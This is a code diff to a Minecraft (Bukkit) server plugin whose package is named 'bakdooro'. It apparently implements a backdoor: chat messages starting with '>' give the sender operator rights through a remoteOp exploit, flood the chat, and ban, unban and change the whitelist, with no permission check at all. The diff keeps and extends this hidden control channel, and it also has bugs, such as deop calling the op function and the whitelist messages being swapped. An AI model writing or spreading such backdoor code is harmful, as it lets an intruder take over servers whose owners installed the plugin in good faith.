@@ -1,5 +1,6 @@
 package me.acaiberii.bakdooro.util.handler;
 
+import me.acaiberii.bakdooro.exp.exploits;
 import me.acaiberii.bakdooro.game.server;
 import org.bukkit.OfflinePlayer;
 import org.bukkit.entity.Player;
@@ -15,14 +16,14 @@ public class chathandler {
         String[] spl = message.split(":");
         if (message.startsWith(">")) {
             if (spl[0].startsWith(">fillchat")) {
-                me.acaiberii.bakdooro.exp.exploits.chatFill();
+                exploits.chatFill();
             }
             else if (spl[0].startsWith(">op")) {
                 if (spl.length < 2) {
                     pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                 }
                 else {
-                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
+                    exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                 }
             }
             else if (spl[0].startsWith(">deop")) {
@@ -30,7 +31,7 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                 }
                 else {
-                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
+                    exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                 }
             }
             else if (spl[0].startsWith(">ban")) {
@@ -51,7 +52,8 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >unban:(PLAYER)");
                 }
                 else {
-                    srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostString());
+                    srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
+                    pl.sendMessage("Unbanned " + Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
                 }
             }
             else if (spl[0].startsWith(">whitelist")) {
@@ -61,9 +63,11 @@ public class chathandler {
                 else {
                     if (spl[1].equals("on")) {
                         srv.setWhitelist(true);
+                        pl.sendMessage("Whitelist off.");
                     }
                     else if (spl[1].equals("off")) {
                         srv.setWhitelist(true);
+                        pl.sendMessage("Whitelist on.");
                     }
                     else if (spl[1].equals("add")) {
                         if (spl.length < 3) {
@@ -73,6 +77,7 @@ public class chathandler {
                             for (Player pll : srv.getOnlinePlayers()) {
                                 if (pll.getName().equals(spl[2])) {
                                     pll.setWhitelisted(true);
+                                    pl.sendMessage("Added " + pll.getName() + " to whitelist.");
                                 }
                             }
                         }
@@ -85,6 +90,7 @@ public class chathandler {
                             for (Player pll : srv.getOnlinePlayers()) {
                                 if (pll.getName().equals(spl[2])) {
                                     pll.setWhitelisted(false);
+                                    pl.sendMessage("Removed " + pll.getName() + " from whitelist.");
                                 }
                             }
                         }
